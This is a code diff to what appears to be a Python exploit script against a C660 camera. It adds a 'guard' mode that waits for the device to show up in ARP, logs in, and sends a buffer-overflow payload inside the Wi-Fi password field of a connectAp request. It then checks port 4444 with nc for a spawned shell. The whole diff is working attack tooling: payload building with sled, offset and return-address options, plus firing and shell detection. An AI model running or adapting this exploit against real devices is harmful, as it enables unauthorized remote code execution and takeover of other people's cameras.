@@ -134,9 +134,85 @@ def connect_params(b64: str, ssid: str, bssid: str) -> dict:
         "password": b64, "unique_key": 0, "band": 0}}}
 
 
+def arp_present(host: str) -> bool | None:
+    """True when `host` has a resolved ARP entry, False when it is absent.
+
+    None means ARP could not be read (no entry and the probe failed) — callers
+    treat that as absent. A missing ARP entry means the unit is off the network:
+    requests would only hit the kernel backlog or a dead IP, and on the C660
+    that is exactly how the wedge was aggravated (fss-wpryz).
+    """
+    subprocess.run(["ping", "-c", "1", "-t", "1", host], capture_output=True)
+    time.sleep(1)
+    r = subprocess.run(["arp", "-n", host], capture_output=True, text=True)
+    out = r.stdout
+    if "no entry" in out or "incomplete" in out:
+        return False
+    return "(incomplete)" not in out and bool(out.strip()) and "-- no entry" not in out
+
+
+def guard_wait(host: str, mac: str | None = None, deadline: float | None = None,
+               poll: float = 10.0) -> bool:
+    """Block until `host` is present in ARP. Prints one line per state change.
+
+    Returns True when present, False when `deadline` (a time.monotonic() value)
+    passed. Never sends requests to the camera itself beyond ICMP/ARP, which a
+    powered-down or wedged unit tolerates.
+    """
+    last = None
+    while True:
+        present = arp_present(host)
+        if present is not last:
+            print("guard: %s %s" % (host, "present" if present else "ABSENT"), flush=True)
+            last = present
+        if present:
+            return True
+        if deadline is not None and time.monotonic() >= deadline:
+            return False
+        time.sleep(poll)
+
+
+def guarded_fire(host: str, args, mac: str | None = None) -> int:
+    """Guard mode: wait for ARP presence, then fire exactly ONE payload.
+
+    Rules from fss-wpryz, measured on the wedged C660: >=3 s between requests,
+    one probe action per connection, stop on the first empty reply, never run
+    while the camera is absent from ARP. `--guard-deadline 0` waits forever;
+    otherwise it is minutes of absence after which we stop and report.
+    """
+    if args.guard_deadline:
+        deadline = time.monotonic() + args.guard_deadline * 60
+    else:
+        deadline = None
+    if not guard_wait(host, mac, deadline):
+        print("guard: %s still absent after the deadline — NOT fired, no spam" % host)
+        return 2
+    time.sleep(args.guard_gap)
+    sess = login(host, tries=600)
+    b64 = build(args.offset, args.marker, args.addr, args.sled, args.padpc,
+                args.prefix.encode(), args.bare, sledfill=args.sledfill,
+                units=args.units, pcround=args.pcround, hang=args.hang)
+    print("firing %s offset=%d addr=%s" % (host, args.offset,
+                                           hex(args.addr) if args.addr else None), flush=True)
+    t0 = time.time()
+    r = req(host, sess, {"method": "connectAp", "params": connect_params(b64, args.ssid, args.bssid)},
+            timeout=8)
+    ok = "raw" not in r
+    print("%.2fs %s" % (time.time() - t0, json.dumps(r)[:200]), flush=True)
+    if not ok:
+        # empty reply = the overflow ran; probe once for the shell and stop.
+        time.sleep(1)
+        p = subprocess.run(["nc", "-z", "-G2", host, "4444"], capture_output=True)
+        if p.returncode == 0:
+            print("SHELL on %s:4444" % host)
+            return 0
+        print("no shell; DECODE-BUFFER zone likely (stop here, do not retry)")
+    return 0 if ok else 1
+
+
 def main():
     ap = argparse.ArgumentParser()
-    ap.add_argument("mode", choices=["build", "send", "ret2stack", "brute"])
+    ap.add_argument("mode", choices=["build", "send", "ret2stack", "brute", "guard"])
     ap.add_argument("--offset", type=lambda x: int(x, 0), default=1060)
     ap.add_argument("--host", default="192.168.6.70")
     ap.add_argument("--ssid", default="Aardvark")
@@ -155,7 +231,15 @@ def main():
     ap.add_argument("--hang", action="store_true", help="end the payload with `b .`")
     ap.add_argument("--count", type=int, default=40)
     ap.add_argument("--step", type=lambda x: int(x, 0), default=0x200)
+    ap.add_argument("--mac", default=None, help="unit MAC for directed ARP in guard mode")
+    ap.add_argument("--guard-deadline", type=float, default=30.0,
+                    help="minutes of absence after which guard mode stops (0 = forever)")
+    ap.add_argument("--guard-gap", type=float, default=3.0,
+                    help="seconds between the ARP-present signal and the single fire")
     a = ap.parse_args()
+
+    if a.mode == "guard":
+        return guarded_fire(a.host, a, a.mac)
 
     if a.mode in ("ret2stack", "brute"):
         base = a.addr
@@ -215,4 +299,4 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    sys.exit(main())
